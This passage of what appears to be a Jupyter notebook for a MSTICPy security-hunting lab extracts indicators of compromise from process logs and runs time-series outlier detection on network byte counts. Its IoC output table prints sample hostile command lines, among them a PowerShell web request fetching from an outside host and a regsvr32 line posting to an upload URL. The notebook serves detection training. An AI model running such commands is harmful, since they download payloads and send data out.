    "# any IoCs in the string?\n",
    "iocs_found = ioc_extractor.extract(cmdline.value)\n",
    "\n",
    "if iocs_found:\n",
    "    print('\\nPotential IoCs found in alert process:')\n",
    "    display(iocs_found)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:22:13.457405Z",
     "start_time": "2022-10-17T18:22:13.452500Z"
    }
   },
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 2 - Extract IoCs from log dataset</a>\n",
    "\n",
    "Perform IoC extraction on the data loaded from previous step (process_enc_logs).\n",
    "1. Choose the columns containing command line logs which may have IoCs and need to be extracted.\n",
    "2. Use either of these (use Python help to find correct parameters such as input data and column name):\n",
    "   - the DataFrame accessor process_enc_logs.mp.iocextract() function\n",
    "   - the `extract` method of the `mp.transform.IoCextractor` class\n",
    "3. Finally display the results\n",
    "\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell commandline</li>\n",
    "<li>Use the DataFrame accessor\n",
    "<pre>\n",
    "    process_logs.mp.iocextract(columns='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<li>Or use the IoCExtract class method\n",
    "<pre>\n",
    "    ioc_extractor.extract(data=process_enc_logs, columns=['CommandLine'])\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:06:46.721439Z",
     "start_time": "2022-10-18T09:06:44.863271Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>IoC patterns found in process tree.</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IoCType</th>\n",
       "      <th>Observable</th>\n",
       "      <th>SourceIndex</th>\n",
       "      <th>Input</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>384</th>\n",
       "      <td>url</td>\n",
       "      <td>http://wh401k.org/getps</td>\n",
       "      <td>967</td>\n",
       "      <td>.\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>678</th>\n",
       "      <td>url</td>\n",
       "      <td>http://www.401k.com/upload?pass=34592389</td>\n",
       "      <td>6091</td>\n",
       "      <td>.\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>984</th>\n",
       "      <td>url</td>\n",
       "      <td>http://wh401k.org/getps</td>\n",
       "      <td>7451</td>\n",
       "      <td>.\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2226</th>\n",
       "      <td>url</td>\n",
       "      <td>https://clients2.google.com/cr/report</td>\n",
       "      <td>9158</td>\n",
       "      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2229</th>\n",
       "      <td>url</td>\n",
       "      <td>https://clients2.google.com/cr/report</td>\n",
       "      <td>9160</td>\n",
       "      <td>C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\Crashpad --url=https://clients2.google.com/cr...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "     IoCType                                Observable  SourceIndex  \\\n",
       "384      url                   http://wh401k.org/getps          967   \n",
       "678      url  http://www.401k.com/upload?pass=34592389         6091   \n",
       "984      url                   http://wh401k.org/getps         7451   \n",
       "2226     url     https://clients2.google.com/cr/report         9158   \n",
       "2229     url     https://clients2.google.com/cr/report         9160   \n",
       "\n",
       "                                                                                                                                                                                                        Input  \n",
       "384                                                                         .\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"  \n",
       "678                                                                                                              .\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post  \n",
       "984                                                                         .\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"  \n",
       "2226  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\...  \n",
       "2229  C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\Crashpad --url=https://clients2.google.com/cr...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_df = ioc_extractor.extract(data=process_logs, columns=['CommandLine'])\n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='url'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>IoC patterns found in process tree.</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IoCType</th>\n",
       "      <th>Observable</th>\n",
       "      <th>SourceIndex</th>\n",
       "      <th>Input</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>5</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>7</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>11</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>13</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2543</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9856</td>\n",
       "      <td>ping  127.0.0.1 -n 29</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2544</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9858</td>\n",
       "      <td>ping  127.0.0.1 -n 29</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2570</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9891</td>\n",
       "      <td>ping  127.0.0.1 -n 18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2571</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9895</td>\n",
       "      <td>ping  127.0.0.1 -n 10</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2572</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9897</td>\n",
       "      <td>ping  127.0.0.1 -n 8</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>337 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "     IoCType Observable  SourceIndex                   Input\n",
       "1       ipv4  127.0.0.1            5  ping  127.0.0.1 -n 15 \n",
       "2       ipv4  127.0.0.1            7  ping  127.0.0.1 -n 15 \n",
       "3       ipv4  127.0.0.1            9  ping  127.0.0.1 -n 15 \n",
       "4       ipv4  127.0.0.1           11  ping  127.0.0.1 -n 15 \n",
       "5       ipv4  127.0.0.1           13  ping  127.0.0.1 -n 15 \n",
       "...      ...        ...          ...                     ...\n",
       "2543    ipv4  127.0.0.1         9856  ping  127.0.0.1 -n 29 \n",
       "2544    ipv4  127.0.0.1         9858  ping  127.0.0.1 -n 29 \n",
       "2570    ipv4  127.0.0.1         9891  ping  127.0.0.1 -n 18 \n",
       "2571    ipv4  127.0.0.1         9895  ping  127.0.0.1 -n 10 \n",
       "2572    ipv4  127.0.0.1         9897   ping  127.0.0.1 -n 8 \n",
       "\n",
       "[337 rows x 4 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_df = process_logs.mp.ioc_extract(columns='CommandLine')\n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='ipv4'])"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Time Series analysis using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has functions to calculate and display time series decomposition results. These can be useful to spot time-based anomalies in something that has a predictable seasonal pattern\n",
    "\n",
    "Fore more details , check the documentation\n",
    "[Time Series Analysis](https://msticpy.readthedocs.io/en/latest/visualization/TimeSeriesAnomalies.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:41.963112Z",
     "start_time": "2022-10-18T10:51:41.949699Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'timeseries'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.analysis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.analysis.timeseries.html target='_blank'>msticpy.analysis.timeseries</a></td></tr>\n",
       "<tr class='cell_mod'><td>msticpy.vis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.vis.timeseries.html target='_blank'>msticpy.vis.timeseries</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('timeseries')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "MSTICPy has a number of built-in queries for MS Sentinel to support time series analysis.\n",
    "\n",
    "- MultiDataSource.get_timeseries_anomalies\n",
    "- MultiDataSource.get_timeseries_data\n",
    "- MultiDataSource.get_timeseries_decompose\n",
    "- MultiDataSource.plot_timeseries_datawithbaseline\n",
    "- MultiDataSource.plot_timeseries_scoreanomolies\n",
    "\n",
    "To use these you will need to connect to sentinel workspace\n",
    "\n",
    "`# Authentication\n",
    "qry_prov = mp.QueryProvider(\"MSSentinel\")\n",
    "qry_prov.connect(mp.WorkspaceConfig(workspace=\"cybersecuritysoc\"))`\n",
    "\n",
    "An example of running the query against connected sentinel workspace and retrieve the time series data.\n",
    "\n",
    "```\n",
    "#Specify start and end timestamps\n",
    "start='2022-09-01 00:00:00.000000'\n",
    "end='2020-10-01 00:00:00.000000'\n",
    "\n",
    "#Execute the query by passing required and optional parameters\n",
    "time_series_data = qry_prov.MultiDataSource.get_timeseries_data(\n",
    "    start=start,\n",
    "    end=end,\n",
    "    table=\"CommonSecurityLog\",\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"SentBytes\",\n",
    "    groupbycolumn=\"DeviceVendor\",\n",
    "    aggregatefunction=\"sum(SentBytes)\",\n",
    "    where_clause='| where DeviceVendor==\"Fortinet\"',\n",
    "    add_query_items='| mv-expand TimeGenerated to typeof(datetime), SentBytes to typeof(long)',\n",
    ")\n",
    "#display the output\n",
    "time_series_data\n",
    "```"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 3 - Find outliers using time series analysis on network data</a>\n",
    "\n",
    "Perform Time series analysis on the sample data loaded in the first step.\n",
    "1. from the loaded dataframe, use python help (`ts_df.mp_timeseries.analyze`) to find correct parameters such as data_column, seasonal parameteres if known otherwise keep default.\n",
    "3. Finally plot the time series of the results from previous steps using `ts_decomp_df.mp_timeseries.plot`\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing time series numerical data.</li>\n",
    "<li>The final command to do time series should look like:\n",
    "<pre>\n",
    "    ts_df.mp_timeseries.analyze(\n",
    "        # time_column=\"TimeGenerated\"  - if the DF is not indexed by timestamp\n",
    "        data_column=\"TotalBytesSent\",\n",
    "        seasonal=7,\n",
    "        period=24\n",
    "    )\n",
    "</pre>\n",
    "</li>\n",
    "<li>You can also plot the results and outliers using the command.\n",
    "<pre>\n",
    "    ts_decomp_df.mp_timeseries.plot(\n",
    "        y=\"TotalBytesSent\",\n",
    "    );\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:53:17.855636Z",
     "start_time": "2022-10-18T10:53:17.841786Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TotalBytesSent</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2020-07-06 00:00:00+00:00</th>\n",
       "      <td>10823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 01:00:00+00:00</th>\n",
       "      <td>14821</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 02:00:00+00:00</th>\n",
       "      <td>13532</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 03:00:00+00:00</th>\n",
       "      <td>11947</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 04:00:00+00:00</th>\n",
       "      <td>11193</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 19:00:00+00:00</th>\n",
       "      <td>18166</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 20:00:00+00:00</th>\n",
       "      <td>13830</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 21:00:00+00:00</th>\n",
       "      <td>13350</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 22:00:00+00:00</th>\n",
       "      <td>11842</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 23:00:00+00:00</th>\n",
       "      <td>11111</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>168 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                          TotalBytesSent\n",
       "TimeGenerated                           \n",
       "2020-07-06 00:00:00+00:00          10823\n",
       "2020-07-06 01:00:00+00:00          14821\n",
       "2020-07-06 02:00:00+00:00          13532\n",
       "2020-07-06 03:00:00+00:00          11947\n",
       "2020-07-06 04:00:00+00:00          11193\n",
       "...                                  ...\n",
       "2020-07-12 19:00:00+00:00          18166\n",
       "2020-07-12 20:00:00+00:00          13830\n",
       "2020-07-12 21:00:00+00:00          13350\n",
       "2020-07-12 22:00:00+00:00          11842\n",
       "2020-07-12 23:00:00+00:00          11111\n",
       "\n",
       "[168 rows x 1 columns]"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "import pandas as pd\n",
    "ts_df = pd.read_pickle('./data/timeseries.pkl')\n",
    "ts_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:22.664592Z",
     "start_time": "2022-10-18T09:28:22.640775Z"
    }
   },
   "outputs": [],
   "source": [
    "#load the module\n",
    "from msticpy.analysis import timeseries\n",
    "\n",
    "# analyze the time series data and find outliers\n",
    "ts_decomp_df = ts_df.mp_timeseries.analyze(\n",
    "    data_column=\"TotalBytesSent\",\n",
    "    seasonal=7,\n",
    "    period=24\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:52.974627Z",
     "start_time": "2022-10-18T09:28:52.794512Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style>\n",
       "        .bk-notebook-logo {\n",
       "            display: block;\n",
       "            width: 20px;\n",
       "            height: 20px;\n",
       "            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAOkSURBVDiNjZRtaJVlGMd/1/08zzln5zjP1LWcU9N0NkN8m2CYjpgQYQXqSs0I84OLIC0hkEKoPtiH3gmKoiJDU7QpLgoLjLIQCpEsNJ1vqUOdO7ppbuec5+V+rj4ctwzd8IIbbi6u+8f1539dt3A78eXC7QizUF7gyV1fD1Yqg4JWz84yffhm0qkFqBogB9rM8tZdtwVsPUhWhGcFJngGeWrPzHm5oaMmkfEg1usvLFyc8jLRqDOMru7AyC8saQr7GG7f5fvDeH7Ej8CM66nIF+8yngt6HWaKh7k49Soy9nXurCi1o3qUbS3zWfrYeQDTB/Qj6kX6Ybhw4B+bOYoLKCC9H3Nu/leUTZ1JdRWkkn2ldcCamzrcf47KKXdAJllSlxAOkRgyHsGC/zRday5Qld9DyoM4/q/rUoy/CXh3jzOu3bHUVZeU+DEn8FInkPBFlu3+nW3Nw0mk6vCDiWg8CeJaxEwuHS3+z5RgY+YBR6V1Z1nxSOfoaPa4LASWxxdNp+VWTk7+4vzaou8v8PN+xo+KY2xsw6une2frhw05CTYOmQvsEhjhWjn0bmXPjpE1+kplmmkP3suftwTubK9Vq22qKmrBhpY4jvd5afdRA3wGjFAgcnTK2s4hY0/GPNIb0nErGMCRxWOOX64Z8RAC4oCXdklmEvcL8o0BfkNK4lUg9HTl+oPlQxdNo3Mg4Nv175e/1LDGzZen30MEjRUtmXSfiTVu1kK8W4txyV6BMKlbgk3lMwYCiusNy9fVfvvwMxv8Ynl6vxoByANLTWplvuj/nF9m2+PDtt1eiHPBr1oIfhCChQMBw6Aw0UulqTKZdfVvfG7VcfIqLG9bcldL/+pdWTLxLUy8Qq38heUIjh4XlzZxzQm19lLFlr8vdQ97rjZVOLf8nclzckbcD4wxXMidpX30sFd37Fv/GtwwhzhxGVAprjbg0gCAEeIgwCZyTV2Z1REEW8O4py0wsjeloKoMr6iCY6dP92H6Vw/oTyICIthibxjm/DfN9lVz8IqtqKYLUXfoKVMVQVVJOElGjrnnUt9T9wbgp8AyYKaGlqingHZU/uG2NTZSVqwHQTWkx9hxjkpWDaCg6Ckj5qebgBVbT3V3NNXMSiWSDdGV3hrtzla7J+duwPOToIg42ChPQOQjspnSlp1V+Gjdged7+8UN5CRAV7a5EdFNwCjEaBR27b3W890TE7g24NAP/mMDXRWrGoFPQI9ls/MWO2dWFAar/xcOIImbbpA3zgAAAABJRU5ErkJggg==);\n",
       "        }\n",
       "    </style>\n",
       "    <div>\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-notebook-logo\"></a>\n",
       "        <span id=\"b43f911b-1a0d-4444-be33-d339dd85d6cc\">Loading BokehJS ...</span>\n",
       "    </div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\nconst JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = cell.output_area._bokeh_server_id;\n    // Clean up Bokeh references\n    if (id != null && id in Bokeh.index) {\n      Bokeh.index[id].model.document.clear();\n      delete Bokeh.index[id];\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim();\n            if (id in Bokeh.index) {\n              Bokeh.index[id].model.document.clear();\n              delete Bokeh.index[id];\n            }\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    const el = document.getElementById(\"b43f911b-1a0d-4444-be33-d339dd85d6cc\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = 